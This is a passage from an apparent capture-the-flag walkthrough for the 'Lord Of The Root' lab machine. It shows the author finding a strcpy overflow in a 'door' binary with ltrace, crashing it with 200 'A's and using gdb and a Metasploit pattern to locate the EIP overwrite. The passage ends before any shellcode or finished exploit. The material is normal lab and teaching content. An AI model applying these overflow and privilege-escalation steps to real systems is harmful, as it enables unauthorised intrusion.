    <div>SYS_brk(0xb772cf39)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0x82de000</div>
    <div>SYS_fcntl64(0x20001, 0xb772eeb6, 0, 1)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_fcntl64(0x20000, 0xb772eeb6, 1, 1)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_fcntl64(0x20000, 0xb772eeb6, 2, 1)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_access("/etc/suid-debug", 00)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = -2</div>
    <div>SYS_access("/etc/ld.so.nohwcap", 00)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = -2</div>
    <div>SYS_mmap2(6200, 0xb7739000, 0xbfff6c38, 0xb772d632)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0xb7712000</div>
    <div>SYS_access("/etc/ld.so.preload", 04)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = -2</div>
    <div>SYS_open("\205\300\211\306xA\215D$ \211D$\b\211t$\004\307\004$\003", -1217190516, 02000000) = 3</div>
    <div>SYS_fstat64(0xb7727ae7, 3, 3, 0xbfff66f0)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_mmap2(3, 0xb7739000, 1, 0xb7727b50)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0xb76fe000</div>
    <div>SYS_close(3)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_access("/etc/ld.so.nohwcap", 00)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = -2</div>
    <div>SYS_open("\203\370\377\211E\330\017\204\020\002", -1217334480, 02000000)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 3</div>
    <div>SYS_read(-1217277307, "\003\004\005\006\a\b\t\n\v\f\r\016\017\020\021\022\023\024\025\026\027\030\031\032\033\034\035\036\037 !""..., 3221186624) = 512</div>
    <div>SYS_fstat64(0xb771dddc, 3, 3, 0xbfff6760)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_mmap2(0xbfff661c, 0xb7739000, 0xbfff67d8, 0xb771e29e)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0xb7550000</div>
    <div>SYS_mmap2(0xbfff661c, 0xb7739000, 0xbfff67d8, 0xb771e41a)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0xb76f8000</div>
    <div>SYS_mmap2(-4096, 0xb7739000, 0xbfff67d8, 0xb771e863)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0xb76fb000</div>
    <div>SYS_close(3)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_mmap2(520, 0xb7739000, 0xbfff6d08, 0xb772d632)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0xb754f000</div>
    <div>SYS_set_thread_area(1, 0, 0xbfff6ce0, -1)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_mprotect(0xb7722bcb, -1217429504, 8192)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_mprotect(0xb7722bcb, -1217167360, 4096)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_munmap(0xb76fe000, 78589)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>__libc_start_main(0x804845d, 2, 0xbfff6df4, 0x80484b0 &lt;unfinished ...&gt;</div>
    <div>Â Â Â Â <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">strcpy(0xbfff6cb1, "test")</font>Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0xbfff6cb1</div>
    <div>Â Â Â Â SYS_exit_group(0 &lt;no return ...&gt;</div>
    <div>+++ exited (status 0) +++</div>
</div>
<div><br /></div>
<div>Let's see if we can send a bunch of 'A's to the program and get it to crash.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>smeagol@LordOfTheRoot:/SECRET/door1$ ltrace -CS -n 4 ./file `python -c 'print "A"*200'`</div>
    <div>SYS_brk(0xb7743f39)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0x924c000</div>
    <div>SYS_fcntl64(0x20001, 0xb7745eb6, 0, 1)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_fcntl64(0x20000, 0xb7745eb6, 1, 1)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_fcntl64(0x20000, 0xb7745eb6, 2, 1)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_access("/etc/suid-debug", 00)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = -2</div>
    <div>SYS_access("/etc/ld.so.nohwcap", 00)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = -2</div>
    <div>SYS_mmap2(6200, 0xb7750000, 0xbfe4fbc8, 0xb7744632)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0xb7729000</div>
    <div>SYS_access("/etc/ld.so.preload", 04)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = -2</div>
    <div>SYS_open("\205\300\211\306xA\215D$ \211D$\b\211t$\004\307\004$\003", -1217096308, 02000000) = 3</div>
    <div>SYS_fstat64(0xb773eae7, 3, 3, 0xbfe4f680)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_mmap2(3, 0xb7750000, 1, 0xb773eb50)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0xb7715000</div>
    <div>SYS_close(3)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_access("/etc/ld.so.nohwcap", 00)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = -2</div>
    <div>SYS_open("\203\370\377\211E\330\017\204\020\002", -1217240272, 02000000)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 3</div>
    <div>SYS_read(-1217183099, "\003\004\005\006\a\b\t\n\v\f\r\016\017\020\021\022\023\024\025\026\027\030\031\032\033\034\035\036\037 !""..., 3219453904) = 512</div>
    <div>SYS_fstat64(0xb7734ddc, 3, 3, 0xbfe4f6f0)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_mmap2(0xbfe4f5ac, 0xb7750000, 0xbfe4f768, 0xb773529e)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0xb7567000</div>
    <div>SYS_mmap2(0xbfe4f5ac, 0xb7750000, 0xbfe4f768, 0xb773541a)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0xb770f000</div>
    <div>SYS_mmap2(-4096, 0xb7750000, 0xbfe4f768, 0xb7735863)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0xb7712000</div>
    <div>SYS_close(3)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_mmap2(520, 0xb7750000, 0xbfe4fc98, 0xb7744632)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0xb7566000</div>
    <div>SYS_set_thread_area(1, 0, 0xbfe4fc70, -1)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_mprotect(0xb7739bcb, -1217335296, 8192)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_mprotect(0xb7739bcb, -1217073152, 4096)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>SYS_munmap(0xb7715000, 78589)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0</div>
    <div>__libc_start_main(0x804845d, 2, 0xbfe4fd84, 0x80484b0 &lt;unfinished ...&gt;</div>
    <div>Â Â Â Â strcpy(0xbfe4fc41, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â Â = 0xbfe4fc41</div>
    <div>--- SIGSEGV (<font style="color: rgb(255, 38, 0); --inversion-type-color: simple;">Segmentation fault</font>) ---</div>
    <div>+++ killed by SIGSEGV +++</div>
</div>
<div><br /></div>
<div>Sending 200 'A's, we are able to get the application to crash. Time to start building a buffer overflow exploit.</div>
<div><br /></div>
<div class="note"><b>NOTE:</b> I tried to start debugging the program on the victim using gdb, but I couldn't get it to crash any more. I suspected the system swapped the vulnerable program to a different "door", so I went back and started ltracing each binary and found that the 'strcpy' one was now behind door3. ðŸ™‚ To prevent further swaps while I was debugging, I copied the vulnerable binary to my attacking machine (via netcat). Once I have an exploit, I'll have to find the currently vulnerable binary and run it against it.</div>
<div class="note"><b>NOTE:</b> You can verify which binary has the vulnerability by checking the file size. The one with a size ofÂ 5150 bytes is the vulnerable one. The others will beÂ 7370 bytes.</div>
<div><br /></div>
<div>We are going to debug the program using gdb (with the <a href="https://github.com/pwndbg/pwndbg" target="_blank">pwndbg plugin</a>) on our attacking machine.</div>
<div><br /></div>
<div>Running and crashing the program in gdb, we see the following.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/lordoftheroot# gdb -q door</div>
    <div>pwndbg: loaded 174 commands. Type pwndbg [filter] for a list.</div>
    <div>pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</div>
    <div>Reading symbols from door...(no debugging symbols found)...done.</div>
    <div>pwndbg&gt; run `python -c 'print "A"*200'`</div>
    <div>Starting program: /root/Walkthroughs/lordoftheroot/door `python -c 'print "A"*200'`</div>
    <div>
        <div><br /></div>
    </div>
    <div>Program received signal SIGSEGV, Segmentation fault.</div>
    <div>0x41414141 in ?? ()</div>
    <div>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</div>
    <div>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</div>
    <div> EAXÂ Â 0x0</div>
    <div> EBXÂ Â 0x0</div>
    <div> ECXÂ Â 0xffffd240 â—‚â€” 0x414141 /* 'AAA' */</div>
    <div> EDXÂ Â 0xffffcf86 â—‚â€” 0x414141 /* 'AAA' */</div>
    <div> EDIÂ Â 0xf7fa0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” insbÂ Â Â byte ptr es:[edi], dx /* 0x1d9d6c */</div>
    <div> ESIÂ Â 0xf7fa0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” insbÂ Â Â byte ptr es:[edi], dx /* 0x1d9d6c */</div>
    <div> EBPÂ Â 0x41414141 ('AAAA')</div>
    <div> ESPÂ Â 0xffffcf70 â—‚â€” 'AAAAAAAAAAAAAAAAAAAAAAAAA'</div>
    <div>
        <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;"> EIPÂ Â 0x41414141 ('AAAA')</font>
    </div>
    <div>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</div>
    <div>Invalid address 0x41414141</div>
    <div>
        <div><br /></div>
        <div><br /></div>
    </div>
    <div>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</div>
    <div>00:0000â”‚ espÂ Â Â Â 0xffffcf70 â—‚â€” 'AAAAAAAAAAAAAAAAAAAAAAAAA'</div>
    <div>... â†“</div>
    <div>06:0018â”‚Â Â Â Â Â Â Â Â 0xffffcf88 â€”â–¸ 0xf7fa0041 (__libc_multiple_libcs+1) â—‚â€” addÂ Â Â Â byte ptr [eax], al /* 0x7f000000 */</div>
    <div>07:001câ”‚Â Â Â Â Â Â Â Â 0xffffcf8c â—‚â€” 0xffffffff</div>
    <div>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</div>
    <div> â–º Â f 0 41414141</div>
    <div>Â Â Â f 1 41414141</div>
    <div>Â Â Â f 2 41414141</div>
    <div>Â Â Â f 3 41414141</div>
    <div>Â Â Â f 4 41414141</div>
    <div>Â Â Â f 5 41414141</div>
    <div>Â Â Â f 6 41414141</div>
    <div>Â Â Â f 7 f7fa0041 __libc_multiple_libcs+1</div>
    <div>Â Â Â f 8 ffffffff</div>
    <div>Program received signal SIGSEGV (fault address 0x41414141)</div>
</div>
<div><br /></div>
<div>We were able to overwrite eip with our 'A's, which is a great first step. Now we need to see how many bytes it takes to overwrite eip. We know it is somewhere between 150 and 200 bytes. To do this, we'll generate a unique string using pattern_create.rb...</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>root@kali:~/Walkthroughs/lordoftheroot# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 220</div>
    <div>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2A</div>
</div>
<div><br /></div>
<div>...and pass it as the parameter.</div>
<div><br /></div>
<div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'>
    <div>pwndbg&gt; run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5</div>
    <div>Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2A</div>
    <div>Starting program: /root/Walkthroughs/lordoftheroot/door Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0A</div>
    <div>d1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2A</div>
    <div>
        <div><br /></div>
    </div>
    <div>Program received signal SIGSEGV, Segmentation fault.</div>
    <div>0x41376641 in ?? ()</div>
    <div>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</div>
    <div>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</div>
    <div> EAXÂ Â 0x0</div>
    <div> EBXÂ Â 0x0</div>
    <div> ECXÂ Â 0xffffd240 â—‚â€” 0x413268 /* 'h2A' */</div>
    <div> EDXÂ Â 0xffffcf8a â—‚â€” 0x413268 /* 'h2A' */</div>
    <div> EDIÂ Â 0xf7fa0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” insbÂ Â Â byte ptr es:[edi], dx /* 0x1d9d6c */</div>
    <div> ESIÂ Â 0xf7fa0000 (_GLOBAL_OFFSET_TABLE_) â—‚â€” insbÂ Â Â byte ptr es:[edi], dx /* 0x1d9d6c */</div>
    <div> EBPÂ Â 0x36664135 ('5Af6')</div>
    <div> ESPÂ Â 0xffffcf60 â—‚â€” 'f8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2A'</div>
    <div>
        <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;"> EIPÂ Â 0x41376641 ('Af7A')</font>
    </div>
    <div>â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</div>
    <div>Invalid address 0x41376641</div>
    <div>
        <div><br /></div>
        <div><br /></div>
    </div>
